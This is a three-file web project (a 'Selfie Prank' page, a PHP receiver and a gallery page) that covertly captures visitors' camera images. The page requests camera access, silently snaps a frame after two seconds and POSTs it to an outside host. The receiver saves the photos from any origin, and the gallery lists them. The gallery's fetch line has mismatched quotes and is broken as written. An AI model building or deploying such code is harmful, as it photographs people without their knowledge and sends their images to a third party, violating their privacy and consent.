<!-- === scanner.html === -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Selfie Prank</title>
</head>
<body>
  <h2>Smile for the camera 😄</h2>
  <video id="video" autoplay playsinline width="320" height="240"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        setTimeout(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageDataURL = canvas.toDataURL('image/png');

          fetch('https://agent-selfie.wuaze.com/receiver.php', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ image: imageDataURL })
          })
          .then(res => res.text())
          .then(data => console.log('Uploaded:', data))
          .catch(err => console.error('Upload failed:', err));

        }, 2000); // capture after 2 seconds
      })
      .catch(error => console.error('Camera access denied:', error));
  </script>
</body>
</html>


<!-- === receiver.php === -->
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

$data = json_decode(file_get_contents("php://input"), true);
if (!isset($data['image'])) {
    http_response_code(400);
    echo "Missing image data.";
    exit;
}

$imageData = $data['image'];
if (preg_match('/^data:image\/(\w+);base64,/', $imageData, $type)) {
    $type = strtolower($type[1]);
    $imageData = substr($imageData, strpos($imageData, ',') + 1);
    $imageData = base64_decode($imageData);

    if ($imageData === false) {
        http_response_code(400);
        echo "Image decode failed.";
        exit;
    }

    $folder = __DIR__ . '/uploads';
    if (!is_dir($folder)) {
        mkdir($folder, 0755, true);
    }

    $filename = uniqid('selfie_', true) . '.' . $type;
    file_put_contents($folder . '/' . $filename, $imageData);

    echo "Saved as $filename";
} else {
    http_response_code(400);
    echo "Invalid image format.";
}
?>


<!-- === gallery.html (optional) === -->
<!DOCTYPE html>
<html>
<head>
  <title>Selfie Gallery</title>
</head>
<body>
  <h1>Gallery of Selfies</h1>
  <div id="gallery"></div>

  <script>
    fetch('[https://script.google.com/macros/s/AKfycbxD67VdSPPsrYClRaFLAaOm2YZYW4Q9D-Ok_2OW8RPvYL8wyHiCnOvSBQNajqgJn1um4A/exec]")
      .then(response => response.text())
      .then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const links = [...doc.querySelectorAll('a')];
        const images = links.filter(link => link.href.match(/\.(jpg|jpeg|png)$/i));

        const gallery = document.getElementById('gallery');
        images.forEach(img => {
          const image = document.createElement('img');
          image.src = img.href;
          image.width = 160;
          image.style.margin = '5px';
          gallery.appendChild(image);
        });
      });
  </script>
</body>
</html>
